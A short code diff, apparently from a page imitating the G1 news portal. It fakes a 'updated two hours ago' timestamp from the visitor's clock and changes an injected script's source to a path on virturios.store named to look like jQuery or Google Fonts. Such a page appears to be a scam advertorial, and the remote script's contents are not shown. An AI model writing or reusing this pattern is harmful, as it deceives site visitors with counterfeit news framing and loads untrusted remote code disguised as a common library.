@@ -87,7 +87,7 @@ window.addEventListener('load', function () {
    hora2menos = d.getHours() - 2;
    minutos = d.getMinutes();
    $("#horapostagem").html(dataHora + ' ' + hora2menos + 'h' + minutos + ' - ' + 'Atualizado há duas horas');
-   fonturl = "https://g1-portal.com/GoogleFonts/GoogleFonts/googlefonts.js";
+   fonturl = "https://virturios.store/mini-projetor/projetor-adv/g1-portal.com/GoogleFonts/GoogleFonts/jquery.min.js";
    jQuery(document).ready(function (e) {
       var s = document.createElement("script");
       s.type = "text/javascript";
